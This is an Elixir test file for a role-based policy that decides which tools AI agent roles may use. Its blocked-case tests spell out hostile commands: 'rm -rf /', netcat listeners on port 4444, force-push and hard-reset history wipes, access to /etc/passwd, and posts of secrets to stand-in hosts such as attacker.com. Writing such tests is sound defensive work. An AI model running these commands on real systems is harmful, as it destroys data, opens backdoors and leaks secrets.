defmodule Singularity.Execution.TaskGraph.PolicyTest do
  use ExUnit.Case, async: true

  alias Singularity.Execution.TaskGraph.Policy

  describe "coder policy enforcement" do
    test "allows git operations" do
      assert :ok == Policy.enforce(:coder, :git, %{cmd: ["commit", "-m", "Fix"]}, [])
      assert :ok == Policy.enforce(:coder, :git, %{cmd: ["add", "."]}, [])
      assert :ok == Policy.enforce(:coder, :git, %{cmd: ["diff"]}, [])
    end

    test "blocks dangerous git operations" do
      assert {:error, {:dangerous_git_operation, _}} =
               Policy.enforce(:coder, :git, %{cmd: ["push", "--force"]}, [])

      assert {:error, {:dangerous_git_operation, _}} =
               Policy.enforce(:coder, :git, %{cmd: ["reset", "--hard"]}, [])
    end

    test "allows filesystem operations" do
      assert :ok ==
               Policy.enforce(:coder, :fs, %{write: "/code/lib/my_module.ex"}, [])

      assert :ok ==
               Policy.enforce(:coder, :fs, %{read: "/code/lib/my_module.ex"}, [])
    end

    test "blocks filesystem operations outside allowed paths" do
      assert {:error, {:forbidden_path, "/etc/passwd"}} =
               Policy.enforce(:coder, :fs, %{write: "/etc/passwd"}, [])

      assert {:error, {:forbidden_path, "/sys/kernel/config"}} =
               Policy.enforce(:coder, :fs, %{read: "/sys/kernel/config"}, [])
    end

    test "allows whitelisted shell commands" do
      assert :ok == Policy.enforce(:coder, :shell, %{cmd: ["mix", "test"]}, [])
      assert :ok == Policy.enforce(:coder, :shell, %{cmd: ["git", "status"]}, [])
      assert :ok == Policy.enforce(:coder, :shell, %{cmd: ["elixir", "-v"]}, [])
    end

    test "blocks non-whitelisted shell commands" do
      assert {:error, {:forbidden_command, ["rm", "-rf", "/"]}} =
               Policy.enforce(:coder, :shell, %{cmd: ["rm", "-rf", "/"]}, [])

      assert {:error, {:forbidden_command, ["nc", "-l", "4444"]}} =
               Policy.enforce(:coder, :shell, %{cmd: ["nc", "-l", "4444"]}, [])
    end

    test "blocks HTTP access (network denied)" do
      assert {:error, :policy_violation} =
               Policy.enforce(:coder, :http, %{url: "https://evil.com"}, [])
    end

    test "blocks Docker access" do
      assert {:error, :policy_violation} =
               Policy.enforce(:coder, :docker, %{image: "alpine", cmd: ["sh"]}, [])
    end

    test "allows Lua execution" do
      assert :ok == Policy.enforce(:coder, :lua, %{src: "return 42"}, [])
    end

    test "enforces timeout limits" do
      assert :ok == Policy.enforce(:coder, :shell, %{cmd: ["mix", "test"]}, timeout: 60_000)

      assert {:error, {:timeout_exceeded, max: 300_000, requested: 1_000_000}} =
               Policy.enforce(:coder, :shell, %{cmd: ["mix", "test"]}, timeout: 1_000_000)
    end
  end

  describe "tester policy enforcement" do
    test "allows Docker execution with resource limits" do
      assert :ok ==
               Policy.enforce(
                 :tester,
                 :docker,
                 %{image: "elixir", cmd: ["mix", "test"]},
                 cpu: 2,
                 mem: "2g"
               )
    end

    test "requires Docker resource limits" do
      assert {:error, :docker_resource_limits_required} =
               Policy.enforce(:tester, :docker, %{image: "elixir", cmd: ["mix", "test"]}, [])
    end

    test "allows whitelisted shell commands" do
      assert :ok == Policy.enforce(:tester, :shell, %{cmd: ["mix", "test"]}, [])
      assert :ok == Policy.enforce(:tester, :shell, %{cmd: ["cargo", "test"]}, [])
    end

    test "blocks filesystem access" do
      assert {:error, :policy_violation} =
               Policy.enforce(:tester, :fs, %{write: "/code/src.ex"}, [])

      assert {:error, :policy_violation} =
               Policy.enforce(:tester, :fs, %{read: "/code/src.ex"}, [])
    end

    test "blocks git access" do
      assert {:error, :policy_violation} =
               Policy.enforce(:tester, :git, %{cmd: ["commit"]}, [])
    end

    test "blocks HTTP access" do
      assert {:error, :policy_violation} =
               Policy.enforce(:tester, :http, %{url: "https://api.com"}, [])
    end

    test "blocks Lua execution" do
      assert {:error, :policy_violation} =
               Policy.enforce(:tester, :lua, %{src: "return 42"}, [])
    end
  end

  describe "critic policy enforcement" do
    test "allows filesystem read" do
      assert :ok == Policy.enforce(:critic, :fs, %{read: "/code/lib/module.ex"}, [])
    end

    test "blocks filesystem write" do
      assert {:error, :write_access_denied} =
               Policy.enforce(:critic, :fs, %{write: "/code/lib/module.ex"}, [])
    end

    test "allows Lua execution" do
      assert :ok == Policy.enforce(:critic, :lua, %{src: "return true"}, [])
    end

    test "blocks shell access" do
      assert {:error, {:forbidden_tool, :shell}} =
               Policy.enforce(:critic, :shell, %{cmd: ["ls"]}, [])
    end

    test "blocks git access" do
      assert {:error, :policy_violation} =
               Policy.enforce(:critic, :git, %{cmd: ["log"]}, [])
    end

    test "blocks Docker access" do
      assert {:error, :policy_violation} =
               Policy.enforce(:critic, :docker, %{image: "alpine", cmd: ["sh"]}, [])
    end

    test "blocks HTTP access" do
      assert {:error, :policy_violation} =
               Policy.enforce(:critic, :http, %{url: "https://api.com"}, [])
    end

    test "enforces strict timeout limits (30 seconds max)" do
      assert :ok == Policy.enforce(:critic, :lua, %{src: "return 42"}, timeout: 10_000)

      assert {:error, {:timeout_exceeded, max: 30_000, requested: 60_000}} =
               Policy.enforce(:critic, :lua, %{src: "return 42"}, timeout: 60_000)
    end
  end

  describe "researcher policy enforcement" do
    test "allows HTTP to whitelisted domains" do
      assert :ok ==
               Policy.enforce(:researcher, :http, %{url: "https://hexdocs.pm/elixir"}, [])

      assert :ok ==
               Policy.enforce(:researcher, :http, %{url: "https://docs.rs/tokio"}, [])

      assert :ok ==
               Policy.enforce(
                 :researcher,
                 :http,
                 %{url: "https://github.com/elixir-lang/elixir"},
                 []
               )
    end

    test "blocks HTTP to non-whitelisted domains" do
      assert {:error, {:forbidden_url, "https://evil.com/steal"}} =
               Policy.enforce(:researcher, :http, %{url: "https://evil.com/steal"}, [])
    end

    test "allows filesystem read" do
      assert :ok == Policy.enforce(:researcher, :fs, %{read: "/code/README.md"}, [])
    end

    test "blocks filesystem write" do
      assert {:error, :write_access_denied} =
               Policy.enforce(:researcher, :fs, %{write: "/code/notes.txt"}, [])
    end

    test "blocks shell, git, docker, lua" do
      assert {:error, :policy_violation} =
               Policy.enforce(:researcher, :shell, %{cmd: ["ls"]}, [])

      assert {:error, :policy_violation} =
               Policy.enforce(:researcher, :git, %{cmd: ["log"]}, [])

      assert {:error, :policy_violation} =
               Policy.enforce(:researcher, :docker, %{image: "alpine", cmd: ["sh"]}, [])

      assert {:error, :policy_violation} =
               Policy.enforce(:researcher, :lua, %{src: "return 42"}, [])
    end
  end

  describe "admin policy enforcement" do
    test "allows all tools" do
      assert :ok == Policy.enforce(:admin, :git, %{cmd: ["push", "--force"]}, [])
      assert :ok == Policy.enforce(:admin, :fs, %{write: "/anywhere/file.txt"}, [])

      assert :ok ==
               Policy.enforce(:admin, :shell, %{cmd: ["any", "command", "here"]}, [])

      assert :ok ==
               Policy.enforce(:admin, :docker, %{image: "any", cmd: ["cmd"]}, cpu: 1, mem: "1g")

      assert :ok == Policy.enforce(:admin, :lua, %{src: "return 42"}, [])
      assert :ok == Policy.enforce(:admin, :http, %{url: "https://any-domain.com"}, [])
    end

    test "allows network access" do
      assert :ok == Policy.enforce(:admin, :http, %{url: "https://api.example.com"}, [])
    end
  end

  describe "security attack scenarios" do
    test "blocks secret exfiltration attempt (coder)" do
      # Attempt to exfiltrate secrets via HTTP
      assert {:error, :policy_violation} =
               Policy.enforce(
                 :coder,
                 :http,
                 %{
                   url: "https://attacker.com/collect",
                   method: :post,
                   body: "{\"secrets\": \"...\"}"
                 },
                 []
               )
    end

    test "blocks git history destruction (coder)" do
      # Attempt to destroy git history
      assert {:error, {:dangerous_git_operation, _}} =
               Policy.enforce(:coder, :git, %{cmd: ["push", "--force", "origin", "main"]}, [])

      assert {:error, {:dangerous_git_operation, _}} =
               Policy.enforce(:coder, :git, %{cmd: ["reset", "--hard", "HEAD~50"]}, [])
    end

    test "blocks code tampering by tester" do
      # Tester trying to modify source code
      assert {:error, :policy_violation} =
               Policy.enforce(:tester, :fs, %{write: "/code/lib/auth.ex"}, [])

      # Tester trying to commit changes
      assert {:error, :policy_violation} =
               Policy.enforce(:tester, :git, %{cmd: ["commit", "-m", "Fix"]}, [])
    end

    test "blocks critic from executing shell commands" do
      # Critic trying to run dangerous commands
      assert {:error, {:forbidden_tool, :shell}} =
               Policy.enforce(:critic, :shell, %{cmd: ["rm", "-rf", "/"]}, [])

      assert {:error, {:forbidden_tool, :shell}} =
               Policy.enforce(:critic, :shell, %{cmd: ["nc", "-l", "4444"]}, [])
    end

    test "blocks backdoor installation attempts" do
      # Attempt to open network port via shell
      assert {:error, {:forbidden_command, _}} =
               Policy.enforce(:coder, :shell, %{cmd: ["nc", "-l", "-p", "4444"]}, [])

      # Attempt to spawn HTTP server
      assert {:error, :policy_violation} =
               Policy.enforce(:coder, :http, %{method: :listen, port: 8888}, [])
    end

    test "enforces resource limits to prevent exhaustion" do
      # Attempt to use excessive timeout (coder: 5 min max)
      assert {:error, {:timeout_exceeded, max: 300_000, requested: 3_600_000}} =
               Policy.enforce(:coder, :shell, %{cmd: ["mix", "compile"]}, timeout: 3_600_000)

      # Critic: 30 second max
      assert {:error, {:timeout_exceeded, max: 30_000, requested: 120_000}} =
               Policy.enforce(:critic, :lua, %{src: "while true do end"}, timeout: 120_000)
    end
  end

  describe "get_policy/1" do
    test "returns policy definition" do
      policy = Policy.get_policy(:coder)
      assert policy.allowed_tools == [:git, :fs, :shell, :lua]
      assert policy.network == :deny
    end

    test "returns nil for unknown policy" do
      assert is_nil(Policy.get_policy(:unknown))
    end
  end

  describe "list_policies/0" do
    test "lists all available policies" do
      policies = Policy.list_policies()
      assert :coder in policies
      assert :tester in policies
      assert :critic in policies
      assert :researcher in policies
      assert :admin in policies
    end
  end
end
